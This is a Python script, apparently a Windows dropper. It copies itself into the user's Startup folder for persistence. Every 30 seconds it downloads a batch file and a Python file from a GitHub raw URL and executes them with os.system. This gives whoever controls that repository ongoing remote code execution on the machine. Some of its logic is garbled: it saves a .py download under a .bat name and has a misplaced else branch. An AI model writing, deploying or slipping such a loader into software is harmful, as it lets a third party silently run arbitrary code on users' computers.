import os
import requests
import urllib.request
import shutil
import getpass
import schedule
import time
import subprocess
import sys


current_user = getpass.getuser()

# Replace these with your GitHub file URL and desired file name
GITHUB_FILE_URL1 = "https://raw.githubusercontent.com/Kyenet/Autorun/main/Shell1.bat"
FILE_NAME1 = f"C:\\Users\\{current_user}\\Downloads\\shell1.bat"
REFRESH = f"https://raw.githubusercontent.com/Kyenet/Autorun/main/main2.py"

# Function to check internet connectivity
def is_internet_available():
    try:
        requests.get("http://www.google.com", timeout=10)
        print("Internet Detected")
        return True
    except requests.ConnectionError:
        print("Internet not detected")
        return False


def download_file():
    try:
        urllib.request.urlretrieve(GITHUB_FILE_URL1, FILE_NAME1)
        print(f"File '{FILE_NAME1}' downloaded successfully.")
        return True
    except Exception as e:
        print(f"Error while downloading the file: {e}")
        return False

def delete_file_if_exists(FILE_NAME1):
    if os.path.exists(FILE_NAME1):
        try:
            os.remove(FILE_NAME1)
            print(f"{FILE_NAME1} has been deleted.")
            return True
        except Exception as e:
            print(f"An error occurred while deleting {FILE_NAME1}: {e}")
    else:
        print(f"{FILE_NAME1} does not exist.")
        return True

# Function to move the program to Windows Startup folder
def move_to_startup_folder():
    try:
        current_user = getpass.getuser()
        source_path = os.path.abspath(__file__)
        startup_folder = f"C:\\Users\\{current_user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        destination_path = os.path.join(startup_folder, os.path.basename(__file__))
        shutil.copy(source_path, destination_path)
        print("Moved program to Windows Startup folder.")
        return True
    except Exception as e:
        print(f"Error while moving the program to the Startup folder: {e}")
        return False

def refresh():
    try:
        urllib.request.urlretrieve(REFRESH, FILE_NAME1)
        os.system(f"{FILE_NAME1}")
        print(f"File refreshed successfully.")
        return True
    except Exception as e:
        print(f"Error while refreshing the file: {e}")
        return False
# Function to be scheduled and run at startup
def main1():
    if refresh():
        if is_internet_available():
            if delete_file_if_exists(FILE_NAME1):
                if download_file():
                    if move_to_startup_folder():
                        try:
                            os.system(f"{FILE_NAME1}")
                        except Exception as e:
                            print(f"Error while running the file: {e}")
                else:
                    print("No internet connection detected")
                    return

schedule.every(30).seconds.do(main1)

while True:
    schedule.run_pending()
    time.sleep(1)